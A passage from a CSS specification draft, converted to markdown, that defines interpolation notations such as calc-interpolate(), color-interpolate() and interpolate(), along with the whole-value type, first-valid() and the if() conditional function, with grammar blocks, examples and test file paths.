<a id="ref-for-typedef-calc-interpolate-segment-options③"></a>

<a id="typedef-calc-interpolate-segment-options"></a>[\<segment-options\>](#typedef-calc-interpolate-segment-options)

<a id="ref-for-typedef-calc-interpolate-segment-options④"></a>

<a id="ref-for-color-interpolation-method"></a>

<a id="ref-for-funcdef-color-interpolate①"></a>

<a id="ref-for-interpolation-map⑦"></a>

When appearing in the first argument, provides any type-specific interpolation options that apply to every segment in the [interpolation map](#interpolation-map). (For example, [color-interpolate()](#funcdef-color-interpolate) allows [\<color-interpolation-method\>](https://drafts.csswg.org/css-color-5/#color-interpolation-method).) When appearing between stops, provides any type-specific interpolation options that apply to the interpolation segment between the stops on either side of this argument, overriding any default provided by a corresponding global [\<segment-options\>](#typedef-calc-interpolate-segment-options) argument.

<a id="ref-for-interpolation-stop③"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①①"></a>

All positions before the first [interpolation stop](#interpolation-stop) map to the first stop’s [\<output-value\>](#typedef-calc-interpolate-input-position), and all positions after the last <a id="ref-for-interpolation-stop④"></a>interpolation stop map to the last stop’s <a id="ref-for-typedef-calc-interpolate-input-position①②"></a>\<output-value\>. In other words, the map fills outward from the first/last stop (just like gradients)—​it does not interpolate beyond them.

### <a id="interpolation-normalization"></a>7.2.  Validation and Normalization

#### <a id="interpolation-validity"></a>7.2.1.  Type Checking

<a id="ref-for-typedef-progress-source⑥"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①③"></a>

<a id="ref-for-number-value①⓪"></a>

<a id="ref-for-percentage-value②②"></a>

<a id="ref-for-propdef-animation-timeline②"></a>

<a id="ref-for-interpolation-input-type-absolute"></a>

<a id="ref-for-interpolation-input-type-proportional"></a>

<a id="ref-for-css-consistent-type④"></a>

<a id="ref-for-interpolation-notations④"></a>

<a id="ref-for-interpolation-range"></a>

Each [\<progress-source\>](#typedef-progress-source) and [\<input-position\>](#typedef-calc-interpolate-input-position) has a <a id="interpolation-input-type"></a>type, which can be <a id="interpolation-input-type-proportional"></a>proportional ([\<number\>](https://drafts.csswg.org/css-values-4/#number-value), [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), or [\<'animation-timeline'\>](https://drafts.csswg.org/css-animations-2/#propdef-animation-timeline)) or <a id="interpolation-input-type-absolute"></a>absolute (all other types, and <a id="ref-for-propdef-animation-timeline③"></a>\<'animation-timeline'\>). The proportional types represent progress as a percentage; any mix of these types is valid. The [absolute](#interpolation-input-type-absolute) types represent progress in absolute dimensions, and all <a id="ref-for-typedef-progress-source⑦"></a>\<progress-source\> and <a id="ref-for-typedef-calc-interpolate-input-position①④"></a>\<input-position\> values that are not [proportional](#interpolation-input-type-proportional) must have a [consistent type](https://drafts.csswg.org/css-values-4/#css-consistent-type) for the notation to be valid. Additionally, an [interpolation notation](#interpolation-notations) whose <a id="ref-for-typedef-progress-source⑧"></a>\<progress-source\> is not <a id="ref-for-interpolation-input-type-proportional①"></a>proportional must have at least one <a id="ref-for-interpolation-input-type-absolute①"></a>absolute <a id="ref-for-typedef-calc-interpolate-input-position①⑤"></a>\<input-position\> (in order to define the [interpolation range](#interpolation-range)), or else the notation is invalid.

<a id="ref-for-propdef-animation-timeline④"></a>

<a id="ref-for-interpolation-input-type-proportional②"></a>

<a id="ref-for-interpolation-input-type-absolute②"></a>

<a id="ref-for-time-value②"></a>

<a id="ref-for-length-value⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: An [\<'animation-timeline'\>](https://drafts.csswg.org/css-animations-2/#propdef-animation-timeline) has both a [proportional](#interpolation-input-type-proportional) type (the percentage progress) as well as an [absolute](#interpolation-input-type-absolute) type ([\<time\>](https://drafts.csswg.org/css-values-4/#time-value) or [\<length\>](https://drafts.csswg.org/css-values-4/#length-value)).

#### <a id="interpolation-range-calculation"></a>7.2.2.  Calculating the Absolute Interpolation Range

<a id="ref-for-typedef-dimension⑦"></a>

<a id="ref-for-interpolation-progress①①"></a>

<a id="ref-for-interpolation-input-type-proportional③"></a>

<a id="ref-for-interpolation-input-type-absolute③"></a>

The <a id="interpolation-range"></a>interpolation range specifies the [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension) values corresponding to 0% and 100% [interpolation progress](#interpolation-progress), and thereby defines the mapping between [proportional](#interpolation-input-type-proportional) and [absolute](#interpolation-input-type-absolute) values.

<a id="ref-for-interpolation-input-type-absolute④"></a>

<a id="ref-for-interpolation-map⑧"></a>

<a id="ref-for-interpolation-stop⑤"></a>

In an [absolutely](#interpolation-input-type-absolute) typed [interpolation map](#interpolation-map), the first and last <a id="ref-for-interpolation-input-type-absolute⑤"></a>absolute stops in the list are assigned to 0% and 100%, respectively. (If there is only one <a id="ref-for-interpolation-input-type-absolute⑥"></a>absolutely typed [interpolation stop](#interpolation-stop), it is assigned to both 0% and 100%.)

<a id="ref-for-interpolation-input-type-proportional④"></a>

<a id="ref-for-interpolation-map⑨"></a>

<a id="ref-for-interpolation-range①"></a>

A [proportionally](#interpolation-input-type-proportional) typed [interpolation map](#interpolation-map) does not define an [interpolation range](#interpolation-range).

#### <a id="interpolation-dimension-normaolization"></a>7.2.3.  Normalizing Absolute Positions and Progress

<a id="ref-for-typedef-progress-source⑨"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①⑥"></a>

<a id="ref-for-typedef-dimension⑧"></a>

<a id="ref-for-interpolation-range②"></a>

If a [\<progress-source\>](#typedef-progress-source) or [\<input-position\>](#typedef-calc-interpolate-input-position) is specified as a [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), it is normalized to a number by linearly interpolating it between the start and end of the [interpolation range](#interpolation-range). (This can produce values less than 0 or greater than 1.)

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-5aa7b8a8"></a> For example, given a function like:
>
> ```text
> background-color: color-interpolate(300px in hsl, 200px: red, 500px: green, 600px: blue);
> ```
>
> <a id="ref-for-interpolation-range③"></a>
>
> <a id="ref-for-typedef-progress-source①⓪"></a>
>
> The [interpolation range](#interpolation-range) is (200px, 600px), so the [\<progress-source\>](#typedef-progress-source) is converted to the number 0.25, and the three stops are converted to the numbers 0, .75, and 1.
>
> Thus, that function is equivalent to:
>
> ```text
> background-color: color-interpolate(25% in hsl, 0%: red, 75%: green, 100%: blue);
> ```
>
> <a id="ref-for-valdef-color-red"></a>
>
> <a id="ref-for-valdef-color-green"></a>
>
> In either case, the result will be a color 1/3 of the way between [red](https://drafts.csswg.org/css-color-4/#valdef-color-red) and [green](https://drafts.csswg.org/css-color-4/#valdef-color-green) using HSL interpolation, giving hsl(40deg, 100%, 50%), a light orange.

#### <a id="interpolation-stop-fixup"></a>7.2.4.  Interpolation Stop Fixup

<a id="ref-for-interpolation-stop⑥"></a>

<a id="ref-for-input-positions③"></a>

Once all [interpolation stops](#interpolation-stop) have been normalized, they are additionally fixed up so that they progress in order from the first stop to the last. If any stop has an [input position](#input-positions) that is less than the <a id="ref-for-input-positions④"></a>input position of the preceding stop, it is set to the <a id="ref-for-input-positions⑤"></a>input position of the previous stop.

### <a id="interpolation-resolution"></a>7.3.  Interpolation Resolution

<a id="ref-for-used-value⑥"></a>

<a id="ref-for-interpolation-notations⑤"></a>

<a id="ref-for-interpolation-progress①②"></a>

<a id="ref-for-interpolation-map①⓪"></a>

The [used value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid [interpolation notation](#interpolation-notations) is the result of mapping its [interpolation progress](#interpolation-progress) through the specified [interpolation map](#interpolation-map).

<a id="ref-for-computed-value⑥"></a>

<a id="ref-for-used-value⑦"></a>

<a id="ref-for-interpolation-progress①③"></a>

<a id="ref-for-input-positions⑥"></a>

<a id="ref-for-interpolation-notations⑥"></a>

<a id="ref-for-number-value①①"></a>

The [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) is the [used value](https://drafts.csswg.org/css-cascade-5/#used-value) if it is possible to calculate. Otherwise, if its [interpolation progress](#interpolation-progress), [input positions](#input-positions), and interpolation options can all be resolved, then it is simplified to a two-stop [interpolation notation](#interpolation-notations) with [\<number\>](https://drafts.csswg.org/css-values-4/#number-value) values for the <a id="ref-for-interpolation-progress①④"></a>interpolation progress and <a id="ref-for-input-positions⑦"></a>input positions, and all other values computed according to their type. Otherwise, it is the <a id="ref-for-interpolation-notations⑦"></a>interpolation notation itself, with its arguments computed individually otherwise.

<a id="ref-for-funcdef-calc-interpolate①"></a>

### <a id="calc-interpolate"></a>7.4.  Interpolated Numeric and Dimensional Values: the [calc-interpolate()](#funcdef-calc-interpolate) notation

<a id="ref-for-interpolation-notations⑧"></a>

<a id="ref-for-funcdef-calc④"></a>

<a id="ref-for-math-function④"></a>

The <a id="funcdef-calc-interpolate"></a>calc-interpolate() [interpolation notation](#interpolation-notations) represents an interpolated numeric or dimensional value. Like [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc), it is a [math function](https://drafts.csswg.org/css-values-4/#math-function), with the following syntax:

<a id="ref-for-funcdef-calc-interpolate②"></a>

<a id="ref-for-typedef-progress-source①①"></a>

<a id="ref-for-comb-all①⓪"></a>

<a id="ref-for-typedef-easing-function⑧"></a>

<a id="ref-for-mult-opt①②"></a>

<a id="ref-for-comb-all①①"></a>

<a id="ref-for-typedef-easing-function⑨"></a>

<a id="ref-for-mult-opt①③"></a>

<a id="ref-for-comb-comma⑨"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①⑦"></a>

<a id="ref-for-mult-num-range②"></a>

<a id="ref-for-typedef-calc-sum①⓪"></a>

<a id="ref-for-comb-comma①⓪"></a>

<a id="ref-for-typedef-easing-function①⓪"></a>

<a id="ref-for-mult-opt①④"></a>

<a id="ref-for-comb-comma①①"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①⑧"></a>

<a id="ref-for-mult-num-range③"></a>

<a id="ref-for-typedef-calc-sum①①"></a>

<a id="ref-for-mult-comma⑤"></a>

<a id="ref-for-mult-opt①⑤"></a>

```text
<calc-interpolate()> = calc-interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>?
  ] ,
  <input-position>{1,2} : <calc-sum> ,
  [ <easing-function>? , <input-position>{1,2} : <calc-sum> ]#? )
```
<a id="ref-for-typedef-calc-sum①②"></a>

<a id="ref-for-number-value①②"></a>

<a id="ref-for-typedef-dimension⑨"></a>

<a id="ref-for-percentage-value②③"></a>

<a id="ref-for-css-consistent-type⑤"></a>

The [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) arguments can resolve to any [\<number\>](https://drafts.csswg.org/css-values-4/#number-value), [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), or [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), but must have a [consistent type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid. The result’s type will be that <a id="ref-for-css-consistent-type⑥"></a>consistent type.

<a id="ref-for-typedef-progress-source①②"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①⑨"></a>

<a id="ref-for-calculation-contexts"></a>

The [\<progress-source\>](#typedef-progress-source) and [\<input-position\>](#typedef-calc-interpolate-input-position) values do not use the inherited [calculation context](https://drafts.csswg.org/css-values-4/#calculation-contexts); they resolve percentages as specified in [§ 7.2 Validation and Normalization](#interpolation-normalization).

<a id="ref-for-funcdef-color-interpolate②"></a>

### <a id="color-interpolate"></a>7.5.  Interpolated Color Values: the [color-interpolate()](#funcdef-color-interpolate) notation

<a id="ref-for-interpolation-notations⑨"></a>

<a id="ref-for-typedef-color③"></a>

The <a id="funcdef-color-interpolate"></a>color-interpolate() [interpolation notation](#interpolation-notations) represents an interpolated [\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color) value, with the following syntax:

<a id="ref-for-funcdef-color-interpolate③"></a>

<a id="ref-for-typedef-progress-source①③"></a>

<a id="ref-for-comb-all①②"></a>

<a id="ref-for-typedef-easing-function①①"></a>

<a id="ref-for-mult-opt①⑥"></a>

<a id="ref-for-comb-all①③"></a>

<a id="ref-for-typedef-easing-function①②"></a>

<a id="ref-for-mult-opt①⑦"></a>

<a id="ref-for-comb-all①④"></a>

<a id="ref-for-color-interpolation-method①"></a>

<a id="ref-for-mult-opt①⑧"></a>

<a id="ref-for-comb-comma①②"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②⓪"></a>

<a id="ref-for-mult-num-range④"></a>

<a id="ref-for-typedef-color④"></a>

<a id="ref-for-comb-comma①③"></a>

<a id="ref-for-typedef-easing-function①③"></a>

<a id="ref-for-comb-any①"></a>

<a id="ref-for-color-interpolation-method②"></a>

<a id="ref-for-mult-opt①⑨"></a>

<a id="ref-for-comb-comma①④"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②①"></a>

<a id="ref-for-mult-num-range⑤"></a>

<a id="ref-for-typedef-color⑤"></a>

<a id="ref-for-mult-comma⑥"></a>

<a id="ref-for-mult-opt②⓪"></a>

```text
<color-interpolate()> = color-interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>? && <color-interpolation-method>?
  ] ,
  <input-position>{1,2} : <color>,
  [
    [ <easing-function> || <color-interpolation-method> ]?,
    <input-position>{1,2} : <color>
  ]#? )
```
<a id="ref-for-funcdef-transform-interpolate①"></a>

### <a id="transform-interpolate"></a>7.6.  Interpolated Transform Values: the [transform-interpolate()](#funcdef-transform-interpolate) notation

<a id="ref-for-interpolation-notations①⓪"></a>

<a id="ref-for-typedef-transform-list⑧"></a>

The <a id="funcdef-transform-interpolate"></a>transform-interpolate() [interpolation notation](#interpolation-notations) represents an interpolated [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list), with the following syntax:

<a id="ref-for-funcdef-transform-interpolate②"></a>

<a id="ref-for-typedef-progress-source①④"></a>

<a id="ref-for-comb-all①⑤"></a>

<a id="ref-for-typedef-easing-function①④"></a>

<a id="ref-for-mult-opt②①"></a>

<a id="ref-for-comb-all①⑥"></a>

<a id="ref-for-typedef-easing-function①⑤"></a>

<a id="ref-for-mult-opt②②"></a>

<a id="ref-for-comb-comma①⑤"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②②"></a>

<a id="ref-for-mult-num-range⑥"></a>

<a id="ref-for-typedef-transform-list⑨"></a>

<a id="ref-for-comb-comma①⑥"></a>

<a id="ref-for-typedef-easing-function①⑥"></a>

<a id="ref-for-mult-opt②③"></a>

<a id="ref-for-comb-comma①⑦"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②③"></a>

<a id="ref-for-mult-num-range⑦"></a>

<a id="ref-for-typedef-transform-list①⓪"></a>

<a id="ref-for-mult-comma⑦"></a>

<a id="ref-for-mult-opt②④"></a>

```text
<transform-interpolate()> = transform-interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>?
  ],
  <input-position>{1,2} : <transform-list>,
  [ <easing-function>?, <input-position>{1,2} : <transform-list> ]#? )
```
<a id="ref-for-funcdef-transform-interpolate③"></a>

<a id="ref-for-typedef-transform-function①"></a>

[transform-interpolate()](#funcdef-transform-interpolate) is, itself, a [\<transform-function\>](https://drafts.csswg.org/css-transforms-2/#typedef-transform-function).

<a id="ref-for-funcdef-interpolate②"></a>

### <a id="mix"></a>7.7.  Interpolated Property Values: the [interpolate()](#funcdef-interpolate) notation

<a id="ref-for-interpolation-notations①①"></a>

The <a id="funcdef-interpolate"></a>interpolate() [interpolation notation](#interpolation-notations) represents the interpolation of entire property values, which supports two alternative syntax patterns:

<a id="ref-for-funcdef-interpolate③"></a>

<a id="ref-for-typedef-progress-source①⑤"></a>

<a id="ref-for-comb-all①⑦"></a>

<a id="ref-for-typedef-easing-function①⑦"></a>

<a id="ref-for-mult-opt②⑤"></a>

<a id="ref-for-comb-all①⑧"></a>

<a id="ref-for-typedef-easing-function①⑧"></a>

<a id="ref-for-mult-opt②⑥"></a>

<a id="ref-for-comb-comma①⑧"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②④"></a>

<a id="ref-for-mult-num-range⑧"></a>

<a id="ref-for-whole-value②"></a>

<a id="ref-for-comb-comma①⑨"></a>

<a id="ref-for-typedef-easing-function①⑨"></a>

<a id="ref-for-mult-opt②⑦"></a>

<a id="ref-for-comb-comma②⓪"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②⑤"></a>

<a id="ref-for-mult-num-range⑨"></a>

<a id="ref-for-whole-value③"></a>

<a id="ref-for-mult-comma⑧"></a>

<a id="ref-for-mult-opt②⑧"></a>

<a id="ref-for-comb-one⑨⑤"></a>

<a id="ref-for-typedef-progress-source①⑥"></a>

<a id="ref-for-comb-all①⑨"></a>

<a id="ref-for-typedef-easing-function②⓪"></a>

<a id="ref-for-mult-opt②⑨"></a>

<a id="ref-for-comb-all②⓪"></a>

<a id="ref-for-typedef-easing-function②①"></a>

<a id="ref-for-mult-opt③⓪"></a>

<a id="ref-for-typedef-keyframes-name"></a>

```text
<interpolate()> = interpolate(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>?
  ] ,
  <input-position>{1,2} : <whole-value>,
  [ <easing-function>?, <input-position>{1,2} : <whole-value> ]#? )
|
  interpolate( <progress-source> && [ by <easing-function> ]?
    && <easing-function>? of <keyframes-name> )
```
<a id="ref-for-interpolation-notations①②"></a>

<a id="ref-for-interpolation-map①①"></a>

<a id="ref-for-interpolation-stop⑦"></a>

<a id="ref-for-cascade"></a>

The first syntax alternative, like other [interpolation notations](#interpolation-notations), assembles an [interpolation map](#interpolation-map) from a list of [interpolation stops](#interpolation-stop). The second uses the corresponding property declarations from a set of keyframes, incorporating those values into the normal [cascade](https://drafts.csswg.org/css-cascade-6/#cascade) for this property.

<a id="ref-for-whole-value④"></a>

Each [\<whole-value\>](#whole-value) argument is computed as if it were the value of this property; and all other arguments computed according to their type.

<a id="ref-for-funcdef-interpolate④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-f5c03c8b"></a> For example, most uses of [interpolate()](#funcdef-interpolate) will resolve at computed-value time:
>
> ```text
> color: interpolate(90%, 0: red, 1: blue);
> /* via simple interpolation,
>    computes to: */
> color: rgb(10% 0 90%);
> 
> color: interpolate(90%, 0: currentcolor, 1: black);
> /* can't be fully resolved at computed-value time,
>    but still has a defined representation: */
> color: color-mix(currentcolor 90%, black 10%);
> 
> float: interpolate(90%, 0: left, 1: right);
> /* discretely animatable */
> float: right;
> ```
<a id="ref-for-funcdef-interpolate⑤"></a>

<a id="ref-for-whole-value⑤"></a>

<a id="ref-for-not-animatable"></a>

The [interpolate()](#funcdef-interpolate) notation is a [\<whole-value\>](#whole-value). Additionally, if any of its <a id="ref-for-whole-value⑥"></a>\<whole-value\> arguments are [not animatable](https://drafts.csswg.org/web-animations-1/#not-animatable), the notation is invalid.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-bdc7682c"></a> For example, the following declarations are invalid, and will be ignored:
>
> ```text
> /* Invalid start value */
> color: interpolate(90%, 0: #invalid, 1: #F00);
> 
> /* Function is mixed with other values */
> background: url(ocean) interpolate(10%, 0: blue, 1: yellow);
> 
> /* 'animation-*' is not animatable */
> animation-delay: interpolate(0%, 0: 0s, 1: 2s);
> ```
## <a id="value-insert"></a>8.  Miscellaneous Value Substituting Functions

<a id="ref-for-whole-value⑦"></a>

### <a id="whole-value"></a>8.1.  Representing An Entire Property Value: the [\<whole-value\>](#whole-value) type

<a id="ref-for-propdef-background-position⑤"></a>

<a id="ref-for-whole-value⑧"></a>

Several functions defined in this specification can only be used as the "whole value" of a property. For example, [background-position: cycle(50px 50px, center);](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) is valid, but <a id="ref-for-propdef-background-position⑥"></a>background-position: cycle(50px, center) 50px; is not. The [\<whole-value\>](#whole-value) production represents these values.

<a id="ref-for-whole-value⑨"></a>

<a id="ref-for-css-wide-keywords"></a>

All properties implicitly accept a [\<whole-value\>](#whole-value) as their entire value, just as they accept the [CSS-wide keywords](https://drafts.csswg.org/css-values-4/#css-wide-keywords) as their entire value.

<a id="ref-for-whole-value①⓪"></a>

When used as a component value of a function, [\<whole-value\>](#whole-value) also represents any CSS value normally valid as the whole value of the property in which it is used (including additional <a id="ref-for-whole-value①①"></a>\<whole-value\> functions). However, some functions may restrict what a <a id="ref-for-whole-value①②"></a>\<whole-value\> argument can include.

<a id="ref-for-funcdef-first-valid"></a>

### <a id="first-valid"></a>8.2.  Selecting the First Supported Value: the [first-valid()](#funcdef-first-valid) notation

<a id="ref-for-at-ruledef-supports①"></a>

CSS supports progressive enhancement with its forward-compatible parsing: authors can declare the same property multiple times in a style rule, using different values each time, and a CSS UA will automatically use the last one that it understands and throw out the rest. This principle, together with the [@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports) rule, allows authors to write stylesheets that work well in old and new UAs simultaneously.

<a id="ref-for-funcdef-var③"></a>

However, using [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) (or similar substitution functions that resolve after parsing) thwarts this functionality; CSS UAs must assume any such property is valid at parse-time.

<a id="ref-for-functional-notation⑤"></a>

The <a id="funcdef-first-valid"></a>first-valid() [functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) inlines the fallback behavior intrinsic to parsing declarations. Unlike most notations, it can accept any valid or invalid syntax in its arguments, and represents the first value among its arguments that is supported (parsed as valid) by the UA as the whole value of the property it’s used in.

<a id="ref-for-funcdef-first-valid①"></a>

<a id="ref-for-typedef-declaration-value⑥"></a>

<a id="ref-for-mult-comma⑨"></a>

```text
<first-valid()> = first-valid( <declaration-value># )
```
<a id="ref-for-invalid-at-computed-value-time"></a>

If none of the arguments represent a valid value for the property, the property is [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-funcdef-first-valid②"></a>

<a id="ref-for-whole-value①③"></a>

[first-valid()](#funcdef-first-valid) is a [\<whole-value\>](#whole-value).

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-3679a886"></a> Should this have a different name? We didn’t quite decide on it during the resolution to add this.

<a id="ref-for-whole-value①④"></a>

<a id="ref-for-funcdef-first-valid③"></a>

<a id="ref-for-typedef-declaration-value⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Despite effectively taking [\<whole-value\>](#whole-value)s as its argument, [first-valid()](#funcdef-first-valid) is instead defined to take [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)s because, by definition, it’s intended to be used in cases <em>where its values might be invalid for the declaration it’s in</em>. <a id="ref-for-typedef-declaration-value⑧"></a>\<declaration-value\> imposes no contextual validity constraints on what it matches, unlike <a id="ref-for-whole-value①⑤"></a>\<whole-value\>.

<a id="ref-for-funcdef-if②"></a>

### <a id="if-notation"></a>8.3.  Conditional Value Selection: the [if()](#funcdef-if) notation

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/if-conditionals.html`
- `css/css-values/if-cycle.html`
- `css/css-values/if-function-revert-rule.html`
- `css/css-values/if-initial-unregistered.html`
- `css/css-values/if-invalidation.html`
- `css/css-values/if-media-invalidation.html`
- `css/css-values/if-range-with-attr-crash.html`
- `css/css-values/if-style-invalidation.html`
- `css/css-values/if-supports-quirks.html`

<a id="ref-for-arbitrary-substitution-function①"></a>

<a id="ref-for-funcdef-if③"></a>

The <a id="funcdef-if"></a>if() function is an [arbitrary substitution function](#arbitrary-substitution-function) that represents conditional values. Its argument consists of an ordered semi-colon–separated list of statements, each consisting of a condition followed by a colon followed by a value. An [if()](#funcdef-if) function represents the value corresponding to the first condition in its argument list to be true; if no condition matches, then the <a id="ref-for-funcdef-if④"></a>if() function represents an empty token stream.

<a id="ref-for-funcdef-if⑤"></a>

The [if()](#funcdef-if) function’s syntax is defined as follows:

<a id="ref-for-funcdef-if⑥"></a>

<a id="ref-for-typedef-if-branch"></a>

<a id="ref-for-mult-zero-plus⑦"></a>

<a id="ref-for-typedef-if-branch①"></a>

<a id="ref-for-mult-opt③①"></a>

<a id="typedef-if-branch"></a>

<a id="ref-for-typedef-if-branch②"></a>

<a id="ref-for-typedef-if-condition"></a>

<a id="ref-for-typedef-declaration-value⑨"></a>

<a id="ref-for-mult-opt③②"></a>

<a id="typedef-if-condition"></a>

<a id="ref-for-typedef-if-condition①"></a>

<a id="ref-for-typedef-boolean-expr⑨"></a>

<a id="ref-for-comb-one⑨⑥"></a>

<a id="typedef-if-test"></a>

<a id="ref-for-typedef-if-test"></a>

<a id="ref-for-typedef-ident②"></a>

<a id="ref-for-typedef-declaration-value①⓪"></a>

<a id="ref-for-comb-one⑨⑦"></a>

<a id="ref-for-typedef-supports-condition"></a>

<a id="ref-for-comb-one⑨⑧"></a>

<a id="ref-for-typedef-media-feature"></a>

<a id="ref-for-comb-one⑨⑨"></a>

<a id="ref-for-typedef-media-condition"></a>

<a id="ref-for-comb-one①⓪⓪"></a>

<a id="ref-for-typedef-style-query"></a>

```text
<if()> = if( [ <if-branch> ; ]* <if-branch> ;? )
<if-branch> = <if-condition> : <declaration-value>?
<if-condition> = <boolean-expr[ <if-test> ]> | else
<if-test> =
  supports( [ <ident> : <declaration-value> ] | <supports-condition> ) |
  media( <media-feature> | <media-condition> ) |
  style( <style-query> )
```
The <a id="valdef-if-else"></a>else keyword represents a condition that is always true.

<a id="ref-for-funcdef-if⑦"></a>

<a id="ref-for-argument-grammar"></a>

The [if()](#funcdef-if) function’s [argument grammar](#argument-grammar) is:

<a id="typedef-if-args"></a>

<a id="ref-for-typedef-if-args"></a>

<a id="ref-for-typedef-if-args-branch"></a>

<a id="ref-for-mult-zero-plus⑧"></a>

<a id="ref-for-typedef-if-args-branch①"></a>

<a id="ref-for-mult-opt③③"></a>

<a id="typedef-if-args-branch"></a>

<a id="ref-for-typedef-if-args-branch②"></a>

<a id="ref-for-typedef-declaration-value①①"></a>

<a id="ref-for-typedef-declaration-value①②"></a>

<a id="ref-for-mult-opt③④"></a>

```text
<if-args> = if( [ <if-args-branch> ; ]* <if-args-branch> ;? )
<if-args-branch> = <declaration-value> : <declaration-value>?
```
<a id="ref-for-typedef-if-args-branch③"></a>

<a id="ref-for-typedef-declaration-value①③"></a>

<a id="ref-for-typedef-colon-token"></a>

<a id="ref-for-free-form-productions⑥"></a>

In the above [\<if-args-branch\>](#typedef-if-args-branch) production, the first [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) excludes top-level [\<colon-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-colon-token)s as part of its [free-form production](#free-form-productions) restrictions (alongside commas and curly braces).

<a id="ref-for-replace-an-arbitrary-substitution-function"></a>

To <a id="replace-an-if-function"></a>[replace an if() function](#replace-an-arbitrary-substitution-function), given a list of <var>arguments</var>:

1.  <a id="ref-for-list-iterate"></a>

    <a id="ref-for-typedef-if-args-branch④"></a>

    [For each](https://infra.spec.whatwg.org/#list-iterate) [\<if-args-branch\>](#typedef-if-args-branch) <var>branch</var> in <var>arguments</var>:

    1.  <a id="ref-for-substitute-arbitrary-substitution-function①"></a>

        <a id="ref-for-typedef-declaration-value①④"></a>

        <a id="ref-for-css-parse-something-according-to-a-css-grammar④"></a>

        <a id="ref-for-typedef-if-condition②"></a>

        <a id="ref-for-iteration-continue"></a>

        [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in the first [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) of <var>branch</var>, then [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) the result as an [\<if-condition\>](#typedef-if-condition). If parsing returns failure, [continue](https://infra.spec.whatwg.org/#iteration-continue); otherwise, let the result be <var>condition</var>.

    2.  Evaluate <var>condition</var>.

        <a id="ref-for-typedef-style-query①"></a>

        <a id="ref-for-guarded"></a>

        <a id="ref-for-substitution-context"></a>

        <a id="ref-for-cyclic-substitution-contexts"></a>

        If a [\<style-query\>](https://drafts.csswg.org/css-conditional-5/#typedef-style-query) in <var>condition</var> tests the value of a property, and [guarding](#guarded) a [substitution context](#substitution-context) «"property", referenced-property-name» would mark it as a [cyclic substitution context](#cyclic-substitution-contexts), that query evaluates to false.

        <a id="ref-for-property-replacement"></a>

        <a id="ref-for-substitution-context①"></a>

        > <strong data-conversion-semantic="example">Example</strong>
        >
        > <a id="example-34dea991"></a> For example, in --foo: if(style(--foo: bar): baz); the style() query is automatically false, since [property replacement](#property-replacement) has already established a «"property", "--foo"» [substitution context](#substitution-context).

        <a id="ref-for-iteration-continue①"></a>

        If the result of <var>condition</var> is false, [continue](https://infra.spec.whatwg.org/#iteration-continue).

    3.  <a id="ref-for-substitute-arbitrary-substitution-function②"></a>

        <a id="ref-for-typedef-declaration-value①⑤"></a>

        [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in the second [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) of <var>branch</var>, and return the result.

2.  <a id="ref-for-component-value②"></a>

    Return nothing (an empty sequence of [component values](https://drafts.csswg.org/css-syntax-3/#component-value)).

<a id="ref-for-at-ruledef-media①"></a>

<a id="ref-for-at-ruledef-supports②"></a>

<a id="ref-for-at-ruledef-container②"></a>

<a id="ref-for-funcdef-if⑧"></a>

<a id="ref-for-valdef-all-revert-rule"></a>

<a id="ref-for-css-wide-keywords①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
